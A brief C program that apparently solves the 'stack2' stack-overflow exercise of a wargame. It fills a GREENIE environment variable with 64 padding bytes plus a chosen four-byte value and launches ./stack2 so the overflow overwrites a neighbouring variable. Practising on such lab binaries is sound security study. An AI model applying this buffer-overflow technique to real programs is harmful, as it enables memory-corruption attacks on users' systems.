#include <stdio.h>
int main(int argc, const char *argv[])
{
    int i               = 0;
    char *my_argv[1]    = {NULL};
    char *my_env[2]     = {NULL};
    char env[76];

    env[0] = 'G';
    env[1] = 'R';
    env[2] = 'E';
    env[3] = 'E';
    env[4] = 'N';
    env[5] = 'I';
    env[6] = 'E';
    env[7] = '=';

    for (i = 8; i < 72; i++){
        env[i] = 'A';
    }
    env[72] = '\x0a';
    env[73] = '\x0d';
    env[74] = '\x0a';
    env[75] = '\x0d';

    my_env[0] = env;
    my_env[1] = NULL;
    
    execve("./stack2", my_argv, my_env);    
    return 0;
}
